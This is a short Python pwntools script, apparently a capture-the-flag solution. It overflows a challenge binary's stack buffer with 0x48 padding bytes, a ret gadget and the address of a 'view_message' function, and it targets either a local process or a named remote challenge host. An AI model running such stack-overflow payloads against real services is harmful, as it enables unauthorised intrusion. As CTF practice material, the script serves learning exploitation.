from pwn import *

if args.LOCAL:
    io = process("./chall")
    if args.GDB:
        cmd = """
        """
        gdb.attach(io, cmd)
else:
    io = remote("challs.nusgreyhats.org", 30211)
elf = ELF('./chall')
pause()
io.sendline(b'A'*0x48+p64(0x000000000040101a)+p64(elf.sym.view_message))

io.interactive()